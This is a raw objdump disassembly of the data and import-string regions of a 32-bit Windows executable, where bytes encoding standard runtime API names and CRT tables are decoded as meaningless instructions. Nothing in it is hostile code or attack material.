  40d3af:	dec    ecx
  40d3b0:	outs   dx,BYTE PTR ds:[esi]
  40d3b1:	outs   dx,WORD PTR ds:[esi]
  40d3b3:	add    BYTE PTR [edx+0x1],dl
  40d3b6:	inc    edi
  40d3b7:	gs je  0x40d3fb
  40d3ba:	inc    ebx
  40d3bb:	push   eax
  40d3bc:	add    BYTE PTR [eax],al
  40d3be:	adc    eax,DWORD PTR [edx]
  40d3c0:	inc    edi
  40d3c1:	gs je  0x40d413
  40d3c4:	inc    ebp
  40d3c5:	dec    ebp
  40d3c6:	inc    ebx
  40d3c7:	push   eax
  40d3c8:	add    BYTE PTR [eax],al
  40d3ca:	fild   DWORD PTR [edx]
  40d3cc:	dec    ecx
  40d3cd:	jae    0x40d425
  40d3cf:	popa   
  40d3d0:	ins    BYTE PTR es:[edi],dx
  40d3d1:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x61506564
  40d3d9:	add    BYTE PTR gs:[bp+si],bl
  40d3dd:	add    ecx,DWORD PTR [ebp+0x75]
  40d3e0:	ins    BYTE PTR es:[edi],dx
  40d3e1:	je     0x40d44c
  40d3e3:	inc    edx
  40d3e4:	jns    0x40d45a
  40d3e6:	gs push esp
  40d3e8:	outs   dx,DWORD PTR ds:[esi]
  40d3e9:	push   edi
  40d3ea:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x726168
  40d3f2:	popf   
  40d3f3:	add    cl,BYTE PTR [eax+0x65]
  40d3f6:	popa   
  40d3f7:	jo     0x40d43a
  40d3f9:	ins    BYTE PTR es:[edi],dx
  40d3fa:	ins    BYTE PTR es:[edi],dx
  40d3fb:	outs   dx,DWORD PTR ds:[esi]
  40d3fc:	arpl   WORD PTR [eax],ax
  40d3fe:	push   esp
  40d3ff:	add    al,0x56
  40d401:	imul   esi,DWORD PTR [edx+0x74],0x416c6175
  40d408:	ins    BYTE PTR es:[edi],dx
  40d409:	ins    BYTE PTR es:[edi],dx
  40d40a:	outs   dx,DWORD PTR ds:[esi]
  40d40b:	arpl   WORD PTR [eax],ax
  40d40d:	add    BYTE PTR [edx+eax*1+0x70616548],ah
  40d414:	push   edx
  40d415:	gs inc ecx
  40d417:	ins    BYTE PTR es:[edi],dx
  40d418:	ins    BYTE PTR es:[edi],dx
  40d419:	outs   dx,DWORD PTR ds:[esi]
  40d41a:	arpl   WORD PTR [eax],ax
  40d41c:	jecxz  0x40d420
  40d41e:	dec    esp
  40d41f:	inc    ebx
  40d420:	dec    ebp
  40d421:	popa   
  40d422:	jo     0x40d477
  40d424:	je     0x40d498
  40d426:	imul   ebp,DWORD PTR [esi+0x67],0xb5000057
  40d42d:	add    cl,BYTE PTR [ecx+0x6e]
  40d430:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40d438:	inc    ebx
  40d439:	jb     0x40d4a4
  40d43b:	je     0x40d4a6
  40d43d:	arpl   WORD PTR [ecx+0x6c],sp
  40d440:	push   ebx
  40d441:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40d446:	outs   dx,BYTE PTR ds:[esi]
  40d447:	inc    ecx
  40d448:	outs   dx,BYTE PTR ds:[esi]
  40d449:	fs push ebx
  40d44b:	jo     0x40d4b6
  40d44d:	outs   dx,BYTE PTR ds:[esi]
  40d44e:	inc    ebx
  40d44f:	outs   dx,DWORD PTR ds:[esi]
  40d450:	jne    0x40d4c0
  40d452:	je     0x40d454
  40d454:	xchg   edx,eax
  40d455:	add    edx,DWORD PTR [edx+0x74]
  40d458:	ins    BYTE PTR es:[edi],dx
  40d459:	push   ebp
  40d45a:	outs   dx,BYTE PTR ds:[esi]
  40d45b:	ja     0x40d4c6
  40d45d:	outs   dx,BYTE PTR ds:[esi]
  40d45e:	fs add ah,bh
  40d461:	add    edx,DWORD PTR [ebx+0x65]
  40d464:	je     0x40d4b9
  40d466:	je     0x40d4cc
  40d468:	dec    eax
  40d469:	popa   
  40d46a:	outs   dx,BYTE PTR ds:[esi]
  40d46b:	fs ins BYTE PTR es:[edi],dx
  40d46d:	add    BYTE PTR gs:[eax],al
  40d470:	add    BYTE PTR [edi+edx*2],0x72
  40d474:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x6f736e6f
  40d47c:	ins    BYTE PTR es:[edi],dx
  40d47d:	gs inc ecx
  40d47f:	add    BYTE PTR [ecx+0x74654701],bl
  40d485:	inc    ebx
  40d486:	outs   dx,DWORD PTR ds:[esi]
  40d487:	outs   dx,BYTE PTR ds:[esi]
  40d488:	jae    0x40d4f9
  40d48a:	ins    BYTE PTR es:[edi],dx
  40d48b:	gs dec edi
  40d48d:	jne    0x40d503
  40d48f:	jo     0x40d506
  40d491:	je     0x40d4d6
  40d493:	push   eax
  40d494:	add    BYTE PTR [eax],al
  40d496:	mov    WORD PTR [edi+edx*2],es
  40d499:	jb     0x40d504
  40d49b:	je     0x40d502
  40d49d:	inc    ebx
  40d49e:	outs   dx,DWORD PTR ds:[esi]
  40d49f:	outs   dx,BYTE PTR ds:[esi]
  40d4a0:	jae    0x40d511
  40d4a2:	ins    BYTE PTR es:[edi],dx
  40d4a3:	gs push edi
  40d4a5:	add    cl,ah
  40d4a7:	add    cl,BYTE PTR [ebx+eax*2+0x4d]
  40d4ab:	popa   
  40d4ac:	jo     0x40d501
  40d4ae:	je     0x40d522
  40d4b0:	imul   ebp,DWORD PTR [esi+0x67],0x3d000041
  40d4b7:	add    al,BYTE PTR [edi+0x65]
  40d4ba:	je     0x40d50f
  40d4bc:	je     0x40d530
  40d4be:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  40d4c5:	inc    ecx
  40d4c6:	add    BYTE PTR [eax],al
  40d4c8:	inc    eax
  40d4c9:	add    al,BYTE PTR [edi+0x65]
  40d4cc:	je     0x40d521
  40d4ce:	je     0x40d542
  40d4d0:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  40d4d7:	push   edi
  40d4d8:	add    BYTE PTR [eax],al
  40d4da:	call   0x74a61be0
  40d4df:	dec    esp
  40d4e0:	outs   dx,DWORD PTR ds:[esi]
  40d4e1:	arpl   WORD PTR [ecx+0x6c],sp
  40d4e4:	gs dec ecx
  40d4e6:	outs   dx,BYTE PTR ds:[esi]
  40d4e7:	outs   dx,WORD PTR ds:[esi]
  40d4e9:	inc    ecx
  40d4ea:	add    BYTE PTR [eax],al
  40d4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ed:	add    cl,BYTE PTR [eax+0x65]
  40d4f0:	popa   
  40d4f1:	jo     0x40d546
  40d4f3:	imul   edi,DWORD PTR [edx+0x65],0x780000
  40d4fa:	inc    ebx
  40d4fb:	jb     0x40d562
  40d4fd:	popa   
  40d4fe:	je     0x40d565
  40d500:	inc    esi
  40d501:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x43004300
  40d509:	ins    BYTE PTR es:[edi],dx
  40d50a:	outs   dx,DWORD PTR ds:[esi]
  40d50b:	jae    0x40d572
  40d50d:	dec    eax
  40d50e:	popa   
  40d50f:	outs   dx,BYTE PTR ds:[esi]
  40d510:	fs ins BYTE PTR es:[edi],dx
  40d512:	add    BYTE PTR gs:[ecx+0x1],al
  40d516:	inc    esi
  40d517:	ins    BYTE PTR es:[edi],dx
  40d518:	jne    0x40d58d
  40d51a:	push   0x656c6946
  40d51f:	inc    edx
  40d520:	jne    0x40d588
  40d522:	data16 gs jb 0x40d599
  40d526:	add    BYTE PTR [eax],al
  40d528:	sub    al,BYTE PTR [edx]
  40d52a:	push   edx
  40d52b:	gs addr16 inc ebx
  40d52e:	ins    BYTE PTR es:[edi],dx
  40d52f:	outs   dx,DWORD PTR ds:[esi]
  40d530:	jae    0x40d597
  40d532:	dec    ebx
  40d533:	gs jns 0x40d536
  40d536:	add    dl,BYTE PTR [bp+si+0x65]
  40d53a:	addr16 push ecx
  40d53c:	jne    0x40d5a3
  40d53e:	jb     0x40d5b9
  40d540:	push   esi
  40d541:	popa   
  40d542:	ins    BYTE PTR es:[edi],dx
  40d543:	jne    0x40d5aa
  40d545:	inc    ebp
  40d546:	js     0x40d589
  40d548:	add    BYTE PTR [eax],al
  40d54a:	pop    edx
  40d54b:	add    dl,BYTE PTR [edx+0x65]
  40d54e:	addr16 dec edi
  40d550:	jo     0x40d5b7
  40d552:	outs   dx,BYTE PTR ds:[esi]
  40d553:	dec    ebx
  40d554:	gs jns 0x40d59c
  40d557:	js     0x40d59a
  40d559:	add    BYTE PTR [ecx+0x44],al
  40d55c:	push   esi
  40d55d:	inc    ecx
  40d55e:	push   eax
  40d55f:	dec    ecx
  40d560:	xor    esi,DWORD PTR [edx]
  40d562:	cs fs ins BYTE PTR es:[edi],dx
  40d565:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .data:

0040e000 <.data>:
  40e000:	add    al,BYTE PTR [eax]
  40e002:	add    BYTE PTR [eax],al
  40e004:	dec    esi
  40e005:	out    0x40,al
  40e007:	mov    ebx,0x44bf19b1
  40e00c:	add    BYTE PTR [eax],al
  40e00e:	add    BYTE PTR [eax],al
  40e010:	add    DWORD PTR [eax],eax
  40e012:	add    BYTE PTR [eax],al
  40e014:	push   ss
  40e015:	add    BYTE PTR [eax],al
  40e017:	add    BYTE PTR [edx],al
  40e019:	add    BYTE PTR [eax],al
  40e01b:	add    BYTE PTR [edx],al
  40e01d:	add    BYTE PTR [eax],al
  40e01f:	add    BYTE PTR [ebx],al
  40e021:	add    BYTE PTR [eax],al
  40e023:	add    BYTE PTR [edx],al
  40e025:	add    BYTE PTR [eax],al
  40e027:	add    BYTE PTR [eax+eax*1],al
  40e02a:	add    BYTE PTR [eax],al
  40e02c:	sbb    BYTE PTR [eax],al
  40e02e:	add    BYTE PTR [eax],al
  40e030:	add    eax,0xd000000
  40e035:	add    BYTE PTR [eax],al
  40e037:	add    BYTE PTR [esi],al
  40e039:	add    BYTE PTR [eax],al
  40e03b:	add    BYTE PTR [ecx],cl
  40e03d:	add    BYTE PTR [eax],al
  40e03f:	add    BYTE PTR [edi],al
  40e041:	add    BYTE PTR [eax],al
  40e043:	add    BYTE PTR [eax+eax*1],cl
  40e046:	add    BYTE PTR [eax],al
  40e048:	or     BYTE PTR [eax],al
  40e04a:	add    BYTE PTR [eax],al
  40e04c:	or     al,0x0
  40e04e:	add    BYTE PTR [eax],al
  40e050:	or     DWORD PTR [eax],eax
  40e052:	add    BYTE PTR [eax],al
  40e054:	or     al,0x0
  40e056:	add    BYTE PTR [eax],al
  40e058:	or     al,BYTE PTR [eax]
  40e05a:	add    BYTE PTR [eax],al
  40e05c:	pop    es
  40e05d:	add    BYTE PTR [eax],al
  40e05f:	add    BYTE PTR [ebx],cl
  40e061:	add    BYTE PTR [eax],al
  40e063:	add    BYTE PTR [eax],cl
  40e065:	add    BYTE PTR [eax],al
  40e067:	add    BYTE PTR [eax+eax*1],cl
  40e06a:	add    BYTE PTR [eax],al
  40e06c:	push   ss
  40e06d:	add    BYTE PTR [eax],al
  40e06f:	add    BYTE PTR ds:0x16000000,cl
  40e075:	add    BYTE PTR [eax],al
  40e077:	add    BYTE PTR [edi],cl
  40e079:	add    BYTE PTR [eax],al
  40e07b:	add    BYTE PTR [edx],al
  40e07d:	add    BYTE PTR [eax],al
  40e07f:	add    BYTE PTR [eax],dl
  40e081:	add    BYTE PTR [eax],al
  40e083:	add    BYTE PTR ds:0x11000000,cl
  40e089:	add    BYTE PTR [eax],al
  40e08b:	add    BYTE PTR [edx],dl
  40e08d:	add    BYTE PTR [eax],al
  40e08f:	add    BYTE PTR [edx],dl
  40e091:	add    BYTE PTR [eax],al
  40e093:	add    BYTE PTR [edx],al
  40e095:	add    BYTE PTR [eax],al
  40e097:	add    BYTE PTR [ecx],ah
  40e099:	add    BYTE PTR [eax],al
  40e09b:	add    BYTE PTR ds:0x35000000,cl
  40e0a1:	add    BYTE PTR [eax],al
  40e0a3:	add    BYTE PTR [edx],al
  40e0a5:	add    BYTE PTR [eax],al
  40e0a7:	add    BYTE PTR [ecx+0x0],al
  40e0aa:	add    BYTE PTR [eax],al
  40e0ac:	or     eax,0x43000000
  40e0b1:	add    BYTE PTR [eax],al
  40e0b3:	add    BYTE PTR [edx],al
  40e0b5:	add    BYTE PTR [eax],al
  40e0b7:	add    BYTE PTR [eax+0x0],dl
  40e0ba:	add    BYTE PTR [eax],al
  40e0bc:	adc    DWORD PTR [eax],eax
  40e0be:	add    BYTE PTR [eax],al
  40e0c0:	push   edx
  40e0c1:	add    BYTE PTR [eax],al
  40e0c3:	add    BYTE PTR ds:0x53000000,cl
  40e0c9:	add    BYTE PTR [eax],al
  40e0cb:	add    BYTE PTR ds:0x57000000,cl
  40e0d1:	add    BYTE PTR [eax],al
  40e0d3:	add    BYTE PTR [esi],dl
  40e0d5:	add    BYTE PTR [eax],al
  40e0d7:	add    BYTE PTR [ecx+0x0],bl
  40e0da:	add    BYTE PTR [eax],al
  40e0dc:	or     eax,DWORD PTR [eax]
  40e0de:	add    BYTE PTR [eax],al
  40e0e0:	ins    BYTE PTR es:[edi],dx
  40e0e1:	add    BYTE PTR [eax],al
  40e0e3:	add    BYTE PTR ds:0x6d000000,cl
  40e0e9:	add    BYTE PTR [eax],al
  40e0eb:	add    BYTE PTR [eax],ah
  40e0ed:	add    BYTE PTR [eax],al
  40e0ef:	add    BYTE PTR [eax+0x0],dh
  40e0f2:	add    BYTE PTR [eax],al
  40e0f4:	sbb    al,0x0
  40e0f6:	add    BYTE PTR [eax],al
  40e0f8:	jb     0x40e0fa
  40e0fa:	add    BYTE PTR [eax],al
  40e0fc:	or     DWORD PTR [eax],eax
  40e0fe:	add    BYTE PTR [eax],al
  40e100:	push   es
  40e101:	add    BYTE PTR [eax],al
  40e103:	add    BYTE PTR [esi],dl
  40e105:	add    BYTE PTR [eax],al
  40e107:	add    BYTE PTR [eax+0xa000000],al
  40e10d:	add    BYTE PTR [eax],al
  40e10f:	add    BYTE PTR [ecx+0xa000000],al
  40e115:	add    BYTE PTR [eax],al
  40e117:	add    BYTE PTR [edx+0x9000000],al
  40e11d:	add    BYTE PTR [eax],al
  40e11f:	add    BYTE PTR [ebx+0x16000000],al
  40e125:	add    BYTE PTR [eax],al
  40e127:	add    BYTE PTR [eax+eax*1+0xd0000],al
  40e12e:	add    BYTE PTR [eax],al
  40e130:	xchg   ecx,eax
  40e131:	add    BYTE PTR [eax],al
  40e133:	add    BYTE PTR [ecx],ch
  40e135:	add    BYTE PTR [eax],al
  40e137:	add    BYTE PTR [esi+0xd000000],bl
  40e13d:	add    BYTE PTR [eax],al
  40e13f:	add    BYTE PTR [ecx+0x2000000],ah
  40e145:	add    BYTE PTR [eax],al
  40e147:	add    BYTE PTR [eax+eax*1+0xb0000],ah
  40e14e:	add    BYTE PTR [eax],al
  40e150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e151:	add    BYTE PTR [eax],al
  40e153:	add    BYTE PTR ds:0xb7000000,cl
  40e159:	add    BYTE PTR [eax],al
  40e15b:	add    BYTE PTR [ecx],dl
  40e15d:	add    BYTE PTR [eax],al
  40e15f:	add    dh,cl
  40e161:	add    BYTE PTR [eax],al
  40e163:	add    BYTE PTR [edx],al
  40e165:	add    BYTE PTR [eax],al
  40e167:	add    bh,dl
  40e169:	add    BYTE PTR [eax],al
  40e16b:	add    BYTE PTR [ebx],cl
  40e16d:	add    BYTE PTR [eax],al
  40e16f:	add    BYTE PTR [eax],bl
  40e171:	pop    es
  40e172:	add    BYTE PTR [eax],al
  40e174:	or     al,0x0
  40e176:	add    BYTE PTR [eax],al
  40e178:	or     al,0x0
  40e17a:	add    BYTE PTR [eax],al
  40e17c:	or     BYTE PTR [eax],al
  40e17e:	add    BYTE PTR [eax],al
  40e180:	mov    ebp,0x402b
  40e185:	add    BYTE PTR [eax],al
  40e187:	add    BYTE PTR [edx],al
  40e189:	add    BYTE PTR [eax],al
  40e18b:	add    al,ah
  40e18d:	mov    bh,0x40
  40e18f:	add    BYTE PTR [eax],cl
  40e191:	add    BYTE PTR [eax],al
  40e193:	add    BYTE PTR [edi+esi*4+0x90040],dh
  40e19a:	add    BYTE PTR [eax],al
  40e19c:	mov    BYTE PTR [edi+0xa0040],dh
  40e1a2:	add    BYTE PTR [eax],al
  40e1a4:	lock mov dh,0x40
  40e1a7:	add    BYTE PTR [eax],dl
  40e1a9:	add    BYTE PTR [eax],al
  40e1ab:	add    ah,al
  40e1ad:	mov    dh,0x40
  40e1af:	add    BYTE PTR [ecx],dl
  40e1b1:	add    BYTE PTR [eax],al
  40e1b3:	add    BYTE PTR [esi+esi*4+0x120040],dl
  40e1ba:	add    BYTE PTR [eax],al
  40e1bc:	jo     0x40e174
  40e1be:	inc    eax
  40e1bf:	add    BYTE PTR [ebx],dl
  40e1c1:	add    BYTE PTR [eax],al
  40e1c3:	add    BYTE PTR [esi+esi*4+0x40],al
  40e1c7:	add    BYTE PTR [eax],bl
  40e1c9:	add    BYTE PTR [eax],al
  40e1cb:	add    BYTE PTR [esi+esi*4],cl
  40e1ce:	inc    eax
  40e1cf:	add    BYTE PTR [ecx],bl
  40e1d1:	add    BYTE PTR [eax],al
  40e1d3:	add    ah,ah
  40e1d5:	mov    ch,0x40
  40e1d7:	add    BYTE PTR [edx],bl
  40e1d9:	add    BYTE PTR [eax],al
  40e1db:	add    BYTE PTR [ebp+esi*4+0x1b0040],ch
  40e1e2:	add    BYTE PTR [eax],al
  40e1e4:	je     0x40e19b
  40e1e6:	inc    eax
  40e1e7:	add    BYTE PTR [eax+eax*1],bl
  40e1ea:	add    BYTE PTR [eax],al
  40e1ec:	dec    esp
  40e1ed:	mov    ch,0x40
  40e1ef:	add    BYTE PTR [esi],bl
  40e1f1:	add    BYTE PTR [eax],al
  40e1f3:	add    BYTE PTR [esi*4+0x1f0040],ch
  40e1fa:	add    BYTE PTR [eax],al
  40e1fc:	enter  0x40b4,0x0
  40e200:	and    BYTE PTR [eax],al
  40e202:	add    BYTE PTR [eax],al
  40e204:	nop
  40e205:	mov    ah,0x40
  40e207:	add    BYTE PTR [ecx],ah
  40e209:	add    BYTE PTR [eax],al
  40e20b:	add    BYTE PTR [eax+0x220040b3],bl
  40e211:	add    BYTE PTR [eax],al
  40e213:	add    al,bh
  40e215:	mov    dl,0x40
  40e217:	add    BYTE PTR [eax+0x0],bh
  40e21a:	add    BYTE PTR [eax],al
  40e21c:	call   0x794122d3
  40e221:	add    BYTE PTR [eax],al
  40e223:	add    al,bl
  40e225:	mov    dl,0x40
  40e227:	add    BYTE PTR [edx+0x0],bh
  40e22a:	add    BYTE PTR [eax],al
  40e22c:	enter  0x40b2,0x0
  40e230:	cld    
  40e231:	add    BYTE PTR [eax],al
  40e233:	add    ah,al
  40e235:	mov    dl,0x40
  40e237:	add    bh,bh
  40e239:	add    BYTE PTR [eax],al
  40e23b:	add    BYTE PTR [edx+esi*4+0x30040],dh
  40e242:	add    BYTE PTR [eax],al
  40e244:	pop    es
  40e245:	add    BYTE PTR [eax],al
  40e247:	add    BYTE PTR [eax+0x0],bh
  40e24a:	add    BYTE PTR [eax],al
  40e24c:	or     al,BYTE PTR [eax]
  40e24e:	add    BYTE PTR [eax],al
  40e250:	(bad)  
  40e251:	(bad)  
  40e252:	(bad)  
  40e253:	inc    DWORD PTR [eax+0xa]
	...
  40e28d:	add    BYTE PTR [eax],al
  40e28f:	add    bh,bh
  40e291:	(bad)  
  40e292:	(bad)  
  40e293:	(bad)  
  40e294:	(bad)  
  40e295:	(bad)  
  40e296:	(bad)  
  40e297:	call   DWORD PTR [eax]
  40e299:	add    BYTE PTR [eax],al
  40e29b:	add    BYTE PTR [eax],al
  40e29d:	add    BYTE PTR [eax],al
  40e29f:	add    BYTE PTR [eax+0x14],al
  40e2a2:	inc    ecx
  40e2a3:	add    BYTE PTR [eax],al
  40e2a5:	add    BYTE PTR [eax],al
  40e2a7:	add    BYTE PTR [eax+0x14],al
  40e2aa:	inc    ecx
  40e2ab:	add    BYTE PTR [ecx],al
  40e2ad:	add    DWORD PTR [eax],eax
	...
  40e2b7:	add    BYTE PTR [eax],al
  40e2b9:	adc    BYTE PTR [eax],al
	...
  40e2cb:	add    BYTE PTR [edx],al
  40e2cd:	add    BYTE PTR [eax],al
  40e2cf:	add    BYTE PTR [ecx],al
	...
  40e2e9:	add    BYTE PTR [eax],al
  40e2eb:	add    BYTE PTR [edx],al
  40e2ed:	add    BYTE PTR [eax],al
  40e2ef:	add    BYTE PTR [edx],al
	...
  40e57d:	add    BYTE PTR [eax],dl
  40e57f:	adc    BYTE PTR [eax],dl
  40e581:	adc    BYTE PTR [eax],dl
  40e583:	adc    BYTE PTR [eax],dl
  40e585:	adc    BYTE PTR [eax],dl
  40e587:	adc    BYTE PTR [eax],dl
  40e589:	adc    BYTE PTR [eax],dl
  40e58b:	adc    BYTE PTR [eax],dl
  40e58d:	adc    BYTE PTR [eax],dl
  40e58f:	adc    BYTE PTR [eax],dl
  40e591:	adc    BYTE PTR [eax],dl
  40e593:	adc    BYTE PTR [eax],dl
  40e595:	adc    BYTE PTR [eax],dl
  40e597:	adc    BYTE PTR [eax],al
  40e599:	add    BYTE PTR [eax],al
  40e59b:	add    BYTE PTR [eax],al
  40e59d:	add    BYTE PTR [eax],ah
  40e59f:	and    BYTE PTR [eax],ah
  40e5a1:	and    BYTE PTR [eax],ah
  40e5a3:	and    BYTE PTR [eax],ah
  40e5a5:	and    BYTE PTR [eax],ah
  40e5a7:	and    BYTE PTR [eax],ah
  40e5a9:	and    BYTE PTR [eax],ah
  40e5ab:	and    BYTE PTR [eax],ah
  40e5ad:	and    BYTE PTR [eax],ah
  40e5af:	and    BYTE PTR [eax],ah
  40e5b1:	and    BYTE PTR [eax],ah
  40e5b3:	and    BYTE PTR [eax],ah
  40e5b5:	and    BYTE PTR [eax],ah
  40e5b7:	and    BYTE PTR [eax],al
	...
  40e67d:	add    BYTE PTR [ecx+0x62],ah
  40e680:	arpl   WORD PTR [ebp+eiz*2+0x66],sp
  40e684:	addr16 push 0x6c6b6a69
  40e68a:	ins    DWORD PTR es:[edi],dx
  40e68b:	outs   dx,BYTE PTR ds:[esi]
  40e68c:	outs   dx,DWORD PTR ds:[esi]
  40e68d:	jo     0x40e700
  40e68f:	jb     0x40e704
  40e691:	je     0x40e708
  40e693:	jbe    0x40e70c
  40e695:	js     0x40e710
  40e697:	jp     0x40e699
  40e699:	add    BYTE PTR [eax],al
  40e69b:	add    BYTE PTR [eax],al
  40e69d:	add    BYTE PTR [ecx+0x42],al
  40e6a0:	inc    ebx
  40e6a1:	inc    esp
  40e6a2:	inc    ebp
  40e6a3:	inc    esi
  40e6a4:	inc    edi
  40e6a5:	dec    eax
  40e6a6:	dec    ecx
  40e6a7:	dec    edx
  40e6a8:	dec    ebx
  40e6a9:	dec    esp
  40e6aa:	dec    ebp
  40e6ab:	dec    esi
  40e6ac:	dec    edi
  40e6ad:	push   eax
  40e6ae:	push   ecx
  40e6af:	push   edx
  40e6b0:	push   ebx
  40e6b1:	push   esp
  40e6b2:	push   ebp
  40e6b3:	push   esi
  40e6b4:	push   edi
  40e6b5:	pop    eax
  40e6b6:	pop    ecx
  40e6b7:	pop    edx
	...
  40e780:	add    BYTE PTR [eax],al
  40e782:	adc    BYTE PTR [eax],dl
  40e784:	adc    BYTE PTR [eax],dl
  40e786:	adc    BYTE PTR [eax],dl
  40e788:	adc    BYTE PTR [eax],dl
  40e78a:	adc    BYTE PTR [eax],dl
  40e78c:	adc    BYTE PTR [eax],dl
  40e78e:	adc    BYTE PTR [eax],dl
  40e790:	adc    BYTE PTR [eax],dl
  40e792:	adc    BYTE PTR [eax],dl
  40e794:	adc    BYTE PTR [eax],dl
  40e796:	adc    BYTE PTR [eax],dl
  40e798:	adc    BYTE PTR [eax],dl
  40e79a:	adc    BYTE PTR [eax],dl
  40e79c:	add    BYTE PTR [eax],al
  40e79e:	add    BYTE PTR [eax],al
  40e7a0:	add    BYTE PTR [eax],al
  40e7a2:	and    BYTE PTR [eax],ah
  40e7a4:	and    BYTE PTR [eax],ah
  40e7a6:	and    BYTE PTR [eax],ah
  40e7a8:	and    BYTE PTR [eax],ah
  40e7aa:	and    BYTE PTR [eax],ah
  40e7ac:	and    BYTE PTR [eax],ah
  40e7ae:	and    BYTE PTR [eax],ah
  40e7b0:	and    BYTE PTR [eax],ah
  40e7b2:	and    BYTE PTR [eax],ah
  40e7b4:	and    BYTE PTR [eax],ah
  40e7b6:	and    BYTE PTR [eax],ah
  40e7b8:	and    BYTE PTR [eax],ah
  40e7ba:	and    BYTE PTR [eax],ah
	...
  40e888:	add    BYTE PTR [ecx+0x62],ah
  40e88b:	arpl   WORD PTR [ebp+eiz*2+0x66],sp
  40e88f:	addr16 push 0x6c6b6a69
  40e895:	ins    DWORD PTR es:[edi],dx
  40e896:	outs   dx,BYTE PTR ds:[esi]
  40e897:	outs   dx,DWORD PTR ds:[esi]
  40e898:	jo     0x40e90b
  40e89a:	jb     0x40e90f
  40e89c:	je     0x40e913
  40e89e:	jbe    0x40e917
  40e8a0:	js     0x40e91b
  40e8a2:	jp     0x40e8a4
  40e8a4:	add    BYTE PTR [eax],al
  40e8a6:	add    BYTE PTR [eax],al
  40e8a8:	add    BYTE PTR [ecx+0x42],al
  40e8ab:	inc    ebx
  40e8ac:	inc    esp
  40e8ad:	inc    ebp
  40e8ae:	inc    esi
  40e8af:	inc    edi
  40e8b0:	dec    eax
  40e8b1:	dec    ecx
  40e8b2:	dec    edx
  40e8b3:	dec    ebx
  40e8b4:	dec    esp
  40e8b5:	dec    ebp
  40e8b6:	dec    esi
  40e8b7:	dec    edi
  40e8b8:	push   eax
  40e8b9:	push   ecx
  40e8ba:	push   edx
  40e8bb:	push   ebx
  40e8bc:	push   esp
  40e8bd:	push   ebp
  40e8be:	push   esi
  40e8bf:	push   edi
  40e8c0:	pop    eax
  40e8c1:	pop    ecx
  40e8c2:	pop    edx
	...
  40e947:	add    BYTE PTR [eax],ah
  40e949:	in     eax,0x40
  40e94b:	add    BYTE PTR [ecx],al
  40e94d:	add    al,BYTE PTR [eax+ecx*1]
  40e950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e951:	add    eax,DWORD PTR [eax]
  40e953:	add    BYTE PTR [eax-0x7e],ah
  40e956:	jns    0x40e8da
  40e958:	and    DWORD PTR [eax],eax
  40e95a:	add    BYTE PTR [eax],al
  40e95c:	add    BYTE PTR [eax],al
  40e95e:	add    BYTE PTR [eax],al
  40e960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e961:	fild   WORD PTR [eax]
  40e963:	add    BYTE PTR [eax],al
  40e965:	add    BYTE PTR [eax],al
  40e967:	add    BYTE PTR [ecx+0xa5],ah
  40e96d:	add    BYTE PTR [eax],al
  40e96f:	add    BYTE PTR [ecx+0xfce09f],al
  40e975:	add    BYTE PTR [eax],al
  40e977:	add    BYTE PTR [eax+0x7e],al
  40e97a:	cmp    ah,0x0
  40e97d:	add    BYTE PTR [eax],al
  40e97f:	add    BYTE PTR [eax-0x3efffffd],ch
  40e985:	mov    ds:0x20a3da,eax
	...
  40e99e:	add    BYTE PTR [eax],al
  40e9a0:	cmp    esi,0x0
  40e9a6:	add    BYTE PTR [eax],al
  40e9a8:	inc    eax
  40e9a9:	inc    BYTE PTR [eax]
  40e9ab:	add    BYTE PTR [eax],al
  40e9ad:	add    BYTE PTR [eax],al
  40e9af:	add    BYTE PTR [ebp-0x3efffffd],dh
  40e9b5:	mov    ds:0x20a3da,eax
	...
  40e9ce:	add    BYTE PTR [eax],al
  40e9d0:	cmp    esi,0x0
  40e9d6:	add    BYTE PTR [eax],al
  40e9d8:	inc    ecx
  40e9d9:	inc    BYTE PTR [eax]
  40e9db:	add    BYTE PTR [eax],al
  40e9dd:	add    BYTE PTR [eax],al
  40e9df:	add    BYTE PTR [esi-0x30fffffd],dh
  40e9e5:	mov    ds:0x1aa2e4,al
  40e9ea:	in     eax,0xa2
  40e9ec:	call   0x414593
	...
  40e9fd:	add    BYTE PTR [eax],al
  40e9ff:	add    BYTE PTR [ecx+0xfe],al
  40ea05:	add    BYTE PTR [eax],al
  40ea07:	add    BYTE PTR [eax+0x7e],al
  40ea0a:	mov    eax,ds:0xfe
  40ea0f:	add    BYTE PTR [ecx+0x5],dl
  40ea12:	add    BYTE PTR [eax],al
  40ea14:	push   ecx
  40ea15:	ficomp DWORD PTR [esi-0x26]
  40ea18:	and    BYTE PTR [eax],al
  40ea1a:	pop    edi
  40ea1b:	fisubr DWORD PTR [edx-0x26]
  40ea1e:	xor    al,BYTE PTR [eax]
	...
  40ea30:	adc    ebx,0xf9e0ded8
  40ea36:	add    BYTE PTR [eax],al
  40ea38:	xor    DWORD PTR [esi-0x7f],edi
  40ea3b:	inc    BYTE PTR [eax]
  40ea3d:	add    BYTE PTR [eax],al
  40ea3f:	add    ah,al
  40ea41:	mov    ebp,0xfffe0040
  40ea46:	(bad)  
  40ea47:	inc    DWORD PTR [ebx+0x0]
  40ea4a:	add    BYTE PTR [eax],al
  40ea4c:	add    BYTE PTR [eax],al
  40ea4e:	add    BYTE PTR [eax],al
  40ea50:	add    DWORD PTR [eax],eax
	...
  40eaa6:	add    BYTE PTR [eax],al
  40eaa8:	dec    eax
  40eaa9:	jmp    0x0:0x40
	...
  40eab8:	dec    eax
  40eab9:	jmp    0x0:0x40
	...
  40eac8:	dec    eax
  40eac9:	jmp    0x0:0x40
	...
  40ead8:	dec    eax
  40ead9:	jmp    0x0:0x40
	...
  40eae8:	dec    eax
  40eae9:	jmp    0x0:0x40
	...
  40eaf8:	add    DWORD PTR [eax],eax
  40eafa:	add    BYTE PTR [eax],al
  40eafc:	add    DWORD PTR [eax],eax
	...
